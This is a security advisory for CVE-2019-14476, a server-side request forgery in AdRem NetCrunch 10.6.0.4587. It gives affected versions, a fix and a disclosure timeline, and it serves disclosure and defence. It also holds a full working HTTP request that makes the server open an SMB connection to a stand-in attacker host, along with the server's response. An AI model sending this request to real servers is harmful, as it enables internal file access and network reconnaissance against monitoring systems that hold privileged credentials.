# CVE ID: CVE-2019-14476
# Subject: Server-Side Request Forgery (SSRF)

Introduction:
-------------
NetCrunch [1] is a so-called "agentless" monitoring solution developed by
AdRem. It allows system administrators to monitor, visualize and get alerts
from many kinds of systems in their network. The solution consists of a server
and a fat client (also called console), as well as a web client.
Due to its architecture, the monitoring server is a critical system as it
holds credentials, most of the time privileged, for all monitored system.
Compass Security identified a Server-Side Request Forgery (SSRF) vulnerability
in the AdRem NetCrunch server. Successful exploitation requires authenticating
as a user and can be performed remotely.
Affected:
---------
Initially vulnerable:
\* AdRem NetCrunch 10.6.0.4587
Not vulnerable:
\* AdRem NetCrunch 10.6.1.4607
No other version was tested, but it is believed that older versions are also
vulnerable.
Technical Description:
----------------------
Every user can trick the server into performing SMB requests to other systems.
An attacker can exploit this to get access to internal files. Furthermore,
this can be abused to perform limited internal network scans. Based on the
returned error messages and the time required to perform a request to a
certain target, the attacker may determine whether a given system exists and
whether it is running a web application.
Request to open the share "\\some-attacker\share\" on the attacker's machine:
POST /ncsrv/dashboards/summary/rpc?api=ncsrv&sid=2120819038 HTTP/1.1
Host: some-server
User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: \*/\*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 129
Cookie: WASessionId=2120811535
Connection: close
[{"action":"IServerFilesBrowse","method":"GetContentOfDirectory","data":["\\\\some-attacker\\share\\","",-1],"type":"rpc","tid":2}]
Response showing that the request was triggered:
HTTP/1.1 200 OK
Connection: close
Content-Type: text/json; charset=UTF-8
Content-Length: 159
Cache-control: no-cache
Date: Wed, 31 Jul 2019 17:19:10 GMT
Pragma: no-cache
Server: AdRem WebApp Server
[{"type":"rpc","tid":2,"action":"IServerFilesBrowse","method":"GetContentOfDirectory","result":{"Directory":{"Name":"\\\\some-attacker\\share\\","Content":[]}}}]
By performing the request above, an SMB connection is opened from the
NetCrunch server to the host some-attacker.
Workaround / Fix:
-----------------
Avoid using user input as a source for the target of a request or prevent
access to this functionality if possible.
As a NetCrunch customer, update your installation to the latest version to
receive the fix.
Timeline:
---------
2019-05-23: Discovery by Thierry Viaccoz, Sylvain Heiniger and Fabio Poloni
2019-08-01: Assigned CVE-2019-14476
2019-08-29: Initial vendor notification
2020-12-08: Coordinated public disclosure date
